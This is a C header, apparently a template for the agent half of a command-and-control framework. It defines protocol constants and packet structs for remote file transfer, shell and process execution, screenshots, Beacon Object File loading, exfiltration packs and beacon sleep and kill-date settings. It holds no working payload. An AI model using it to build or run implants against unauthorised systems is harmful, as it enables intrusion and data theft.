// __NAME__ Agent — Wire Protocol Constants & Types
//
// Defines protocol constants and data structures for C2 communication.
// This file can be replaced by the protocol generator.

#pragma once

#include <windows.h>

// ─── Protocol constants ────────────────────────────────────────────────────────

#define PROTO_MAGIC        0x__WATERMARK__
#define PROTO_VERSION      1

// Task types (must match server-side Go plugin pl_utils.go)
#define TASK_TYPE_COMMAND   0x01
#define TASK_TYPE_RESPONSE  0x02
#define TASK_TYPE_PROXY     0x03

// ─── Command codes (must match constants.go.tmpl) ──────────────────────────────

#define COMMAND_EXIT            0
#define COMMAND_UNKNOWN         1

#define COMMAND_FS_LIST         10
#define COMMAND_FS_UPLOAD       11
#define COMMAND_FS_DOWNLOAD     12
#define COMMAND_FS_REMOVE       13
#define COMMAND_FS_MKDIRS       14
#define COMMAND_FS_COPY         15
#define COMMAND_FS_MOVE         16
#define COMMAND_FS_CD           17
#define COMMAND_FS_PWD          18
#define COMMAND_FS_CAT          19

#define COMMAND_OS_RUN          20
#define COMMAND_OS_INFO         21
#define COMMAND_OS_PS           22
#define COMMAND_OS_SCREENSHOT   23
#define COMMAND_OS_SHELL        24
#define COMMAND_OS_KILL         25

#define COMMAND_PROFILE_SLEEP       40
#define COMMAND_PROFILE_KILLDATE    41
#define COMMAND_PROFILE_WORKTIME    42

#define COMMAND_EXEC_BOF        50
#define COMMAND_EXEC_BOF_OUT    51
#define COMMAND_EXEC_BOF_ASYNC  52

#define COMMAND_JOB_LIST        60
#define COMMAND_JOB_KILL        61

// ─── Response codes ────────────────────────────────────────────────────────────

#define RESP_COMPLETE           0
#define RESP_ERROR              1
#define RESP_FS_LIST            10
#define RESP_FS_UPLOAD          11
#define RESP_FS_DOWNLOAD        12
#define RESP_FS_PWD             18
#define RESP_FS_CAT             19
#define RESP_OS_RUN             20
#define RESP_OS_INFO            21
#define RESP_OS_PS              22
#define RESP_OS_SCREENSHOT      23
#define RESP_OS_SHELL           24

// ─── Pack types ────────────────────────────────────────────────────────────────

#define EXFIL_PACK              100
#define JOB_PACK                101
#define BOF_PACK                102

// ─── BOF callback & error codes ────────────────────────────────────────────────

#define CALLBACK_OUTPUT         0x0
#define CALLBACK_OUTPUT_OEM     0x1e
#define CALLBACK_OUTPUT_UTF8    0x20
#define CALLBACK_ERROR          0x0d
#define CALLBACK_CUSTOM         0x1000
#define CALLBACK_CUSTOM_LAST    0x13ff

#define CALLBACK_AX_SCREENSHOT      0x81
#define CALLBACK_AX_DOWNLOAD_MEM    0x82

#define BOF_ERROR_PARSE         0x101
#define BOF_ERROR_SYMBOL        0x102
#define BOF_ERROR_MAX_FUNCS     0x103
#define BOF_ERROR_ENTRY         0x104
#define BOF_ERROR_ALLOC         0x105

// ─── Wire structures ──────────────────────────────────────────────────────────

#pragma pack(push, 1)

typedef struct {
    ULONG magic;
    ULONG size;
    BYTE  type;
} PacketHeader;

typedef struct {
    ULONG commandId;
    ULONG dataSize;
    // followed by BYTE data[dataSize]
} TaskHeader;

#pragma pack(pop)
